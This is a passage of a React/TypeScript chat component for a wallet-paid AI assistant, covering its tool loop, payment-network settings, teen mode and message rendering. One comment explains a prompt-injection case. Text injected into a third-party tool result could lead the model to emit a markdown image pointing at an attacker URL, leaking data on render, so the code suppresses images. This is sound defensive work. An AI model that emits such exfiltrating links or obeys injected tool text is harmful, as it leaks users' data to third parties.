            formatDateContext(new Date(), Intl.DateTimeFormat().resolvedOptions().timeZone),
          ]
            .filter(Boolean)
            .join("\n\n"),
        },
        ...messages.map((msg) => ({ role: msg.role, content: msg.content })),
        { role: "user", content: userMessage.trim() },
      ];

      // The loop itself lives in utils/toolLoop.ts — this component keeps state and rendering.
      // `availableTools` already applies the owner gate; what is left to subtract here is what the
      // user switched off in the ToolSelector. Failures within the turn are the loop's business.
      const offeredTools = availableTools
        .filter((entry) => !disabledTools.has(entry.tool.function.name))
        .map((entry) => ({ tool: entry.tool, source: entry.source, paid: entry.paid }));

      const { finalContent, finalImageUrl, sources } = await runToolLoop<ToolSource>(convo, offeredTools, {
        ensureReady: async () => {
          const switched = await switchIfNeeded();
          if (!switched) {
            throw new Error(getSwitchError() ?? `Please switch your wallet to ${getViemChain(network).name}`);
          }
        },
        payAndSend,
        runToolCall,
      });

      const assistantMsg: ChatMessage = {
        role: "assistant",
        // Hops exhausted after a successful generation: the image is on screen and paid for, so
        // "no response" is wrong. Only the model's closing sentence is missing.
        content: finalContent ?? (finalImageUrl ? imageReadyMessage : noResponseMessage),
        timestamp: Date.now(),
        imageUrl: finalImageUrl,
        sources: sources.length > 0 ? sources : undefined,
      };
      setMessages((prev) => [...prev, assistantMsg]);
    } catch (error) {
      const errorMsg: ChatMessage = {
        role: "assistant",
        content: `${errorPrefixMessage} ${error instanceof Error ? error.message : unknownErrorLabel}`,
        timestamp: Date.now(),
      };
      setMessages((prev) => [...prev, errorMsg]);
    } finally {
      setToolCard(null);
      setIsLoading(false);
    }
  };

  const clearChat = () => setMessages([]);

  // Nulling the ref after resolving is what makes a double-click harmless: the second click
  // resolves nothing, since only the first reaches a live resolver.
  function handleToolConfirm(prompt: string, size: ToolSize) {
    confirmResolverRef.current?.({ action: "confirm", prompt, size });
    confirmResolverRef.current = null;
  }

  function handleToolCancel() {
    confirmResolverRef.current?.({ action: "cancel" });
    confirmResolverRef.current = null;
  }

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault();
      if (isConnected) {
        void sendMessage(currentInput);
      }
    }
  };

  const handleSendClick = () => {
    if (!isConnected) {
      connectWallet("assistant-v2", { hasInput: currentInput.trim().length > 0 });
      return;
    }
    void sendMessage(currentInput);
  };

  const receiptUrl = paymentReceipt ? explorerTxUrl(paymentReceipt.network, paymentReceipt.transaction) : null;

  /**
   * The side panel's contents, built once and rendered in both the desktop sidebar and the mobile
   * footer — they showed the same controls in the same order before, as two copies that had to be
   * kept in step by hand.
   *
   * Ordered by the questions someone actually asks, in that order: how do I want it to talk to me,
   * what can it do, and only then how the thing works underneath. The last group is behind a
   * disclosure because a payment network and a bring-your-own-agent URL are machinery — but a
   * reachable one, since `/agent-onboarding` invites people to plug in their own agent and
   * hiding that behind an owner check would quietly withdraw the invitation.
   *
   * Clear chat is deliberately absent: it is an action, not a setting, and it lives in the title
   * row next to the conversation it clears.
   */
  const sidebarBlocks = (
    <>
      <div className={chat.sidebarSection}>{teenToggle}</div>

      <div className={chat.sidebarSection}>
        <ToolSelector options={toolSelectorOptions} disabled={disabledTools} onToggle={toggleTool} />
      </div>

      <details className={chat.sidebarSection}>
        <summary className={chat.advancedSummary}>{advancedLabel}</summary>
        <div className={chat.advancedBody}>
          <div className={chat.sidebarSection}>
            <h4 className={chat.sidebarHeading}>{networkLabel}</h4>
            <div className={chat.networkOptions}>
              {CHAT_NETWORKS.map((option) => {
                const selected = paymentNetwork === option;
                return (
                  <button
                    key={option}
                    onClick={() => storeNetwork(option)}
                    aria-pressed={selected}
                    aria-label={getChainName(option)}
                    className={button({ visual: "secondary", size: "sm", active: selected })}
                  >
                    <span className={selected ? undefined : chat.networkOptionMuted}>
                      <ChainBadge network={option} size="sm" position="inline" />
                    </span>
                  </button>
                );
              })}
            </div>
            {/* Only surfaced when the agent forced our hand — otherwise the buttons speak
                for themselves and a permanent caption would just be noise. */}
            {paymentNetwork !== desiredNetwork && (
              <p className={chat.networkNote}>
                {networkFallbackLabel} <ChainBadge network={paymentNetwork} size="sm" position="inline" />.
              </p>
            )}
          </div>

          <div className={chat.sidebarSection}>
            <h4 className={chat.sidebarHeading}>Agent</h4>
            <AgentInfoPanel service="llm" variant="sidebar" agentCard={activeCard} />
            <AgentSelector
              customUrlInput={customUrlInput}
              onCustomUrlInputChange={setCustomUrlInput}
              customCard={customCard}
              checkState={checkState}
              checkError={checkError}
              onTryCustomAgent={() => void tryCustomAgent()}
              onUseDefaultAgent={useDefaultAgent}
            />
          </div>
        </div>
      </details>
    </>
  );

  return (
    <div className={chat.pageContainer}>
      <div className={`${chat.grid} ${isMobile ? chat.gridMobile : chat.gridDesktop}`}>
        {/* Sidebar - desktop only */}
        {!isMobile && <div className={chat.sidebar({ teen: teenMode })}>{sidebarBlocks}</div>}

        {/* Chat Area */}
        <div className={chat.chatArea}>
          {/* Page heading. /assistent is `explore` territory (utils/territory.ts) but never
              showed it — the rule under the title is how every other section announces where
              you are (see pages/x402/+Page.tsx). Rendered once for both viewports so the page
              never carries two competing headings; on mobile it keeps the clear-chat button
              beside it, which is what the old mobile-only header existed for. */}
          <div className={chat.titleRow}>
            <div>
              {/* Teen mode repaints the rule, which is the only place this site expresses
                  "you are somewhere else". The route is still the lab, so utils/territory.ts
                  is untouched — `teen` is a variant of the rule, not a territory. */}
              <PageHeader title={titleLabel} territory={teenMode ? "teen" : "explore"} />
            </div>
            {/* Both viewports: clearing the chat is an action on the conversation, so it sits
                beside it rather than in the settings panel, which used to carry a whole
                "Actions" section for this one button. */}
            <div className={chat.mobileActions}>
              <button
                onClick={clearChat}
                className={button({ visual: "secondary", size: "sm" })}
                title={clearChatLabel}
                aria-label={clearChatLabel}
              >
                🗑️
              </button>
            </div>
          </div>

          {/* Messages Container */}
          <div className={chat.messagesContainer({ teen: teenMode })}>
            {messages.length === 0 ? (
              <div className={chat.emptyState}>
                {emptyStateLabel}
                {/* The one moment someone is looking at the middle of an empty screen with
                    nothing to read. Offered here rather than only in the sidebar, which is
                    the difference between a mode that exists and one anybody finds. */}
                {!teenMode && (
                  <div className={chat.emptyStateOffer}>
                    <button onClick={() => storeTeenMode(true)} className={button({ visual: "secondary", size: "sm" })}>
                      {teenModeOfferLabel}
                    </button>
                  </div>
                )}
              </div>
            ) : (
              messages.map((message, index) => (
                <div
                  key={index}
                  className={`${chat.messageContainer({ teen: teenMode })} ${
                    message.role === "user" ? chat.messageContainerUser : chat.messageContainerAssistant
                  }`}
                >
                  <div
                    className={`${chat.messageBubble} ${
                      message.role === "user" ? chat.messageBubbleUser({ teen: teenMode }) : chat.messageBubbleAssistant
                    }`}
                  >
                    <div className={chat.messageRole}>{message.role === "user" ? youLabel : assistantLabel}</div>
                    {/* The assistant's reply is prose, so it takes the serif; your own message
                        is input to a tool and stays in the sans. See IDENTITY.md. */}
                    <div
                      className={`${chat.messageContent} ${
                        message.role === "assistant" ? chat.messageContentReading : ""
                      }`}
                    >
                      {message.role === "assistant" ? (
                        /* Markdown images are dropped, links are not. An image loads itself the
                           moment it renders, so a model talked into emitting
                           `![](https://attacker/?q=…)` — by injected text in a tool result, which
                           the Bundestakt lookups pull from a third-party API without any
                           confirmation step — would exfiltrate on sight. A link needs a click.
                           This does NOT affect the generated image below: that renders through
                           its own <img>, not through markdown. */
                        <ReactMarkdown remarkPlugins={[remarkGfm]} components={{ img: () => null }}>
                          {message.content}
                        </ReactMarkdown>
                      ) : (
                        <div className={chat.messageContentPlain}>{message.content}</div>
                      )}
                      {message.imageUrl && (
                        <img
                          src={message.imageUrl}
                          alt=""
                          className={css({ maxWidth: "100%", borderRadius: "md", marginTop: "2" })}
                        />
                      )}
                      {message.sources?.map((source) => (
                        <div key={source} className={chat.messageSource}>
                          <a href={sourceLinks[source].href} target="_blank" rel="noopener noreferrer">
                            {sourceLinks[source].label}
                          </a>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              ))
            )}

            {isLoading && (
              <div className={chat.loadingMessage}>
                {/* A drained channel tops itself up mid-send (see useX402Chat). Saying so keeps
                    the wallet signature that follows from arriving unexplained. */}
                <div className={chat.loadingBubble}>{chatStatus === "topping-up" ? toppingUpLabel : typingLabel}</div>
              </div>
            )}

            {toolCard && (
              <ToolConfirmCard
                prompt={toolCard.prompt}
                size={toolCard.size}
                phase={toolCard.phase}
                network={imageNetwork}
                onConfirm={handleToolConfirm}
                onCancel={handleToolCancel}
              />
            )}
          </div>

          {/* Payment receipt (deposit tx on the first message) */}
          {receiptUrl && (
            <div className={css({ paddingX: "4", paddingBottom: "2", fontSize: "sm" })}>
              <a href={receiptUrl} target="_blank" rel="noopener noreferrer" className={css({ color: "blue.600" })}>
                {viewPaymentLabel} ↗
              </a>
            </div>
          )}

          {/* Input Area */}
          <div className={chat.inputArea}>
            <textarea
              value={currentInput}
              onChange={(e) => setCurrentInput(e.target.value)}
              onKeyPress={handleKeyPress}
              placeholder={placeholderLabel}
              disabled={isLoading}
              className={chat.messageInput({ teen: teenMode })}
            />
            <button
              onClick={handleSendClick}
              onMouseEnter={() => {
                if (!isConnected) {
                  trackEvent("assistant-v2-connect-button-hover");
                }
              }}
              disabled={isLoading || (!isConnected ? false : !currentInput.trim())}
              className={button({ visual: teenMode ? "teen" : "primary" })}
            >
              {getButtonText(buttonState)}
            </button>
          </div>

          {/* The same panel as the desktop sidebar, below the composer rather than beside it. */}
          {isMobile && sidebarBlocks}
        </div>
      </div>
    </div>
  );
}

export default AssistantChat;
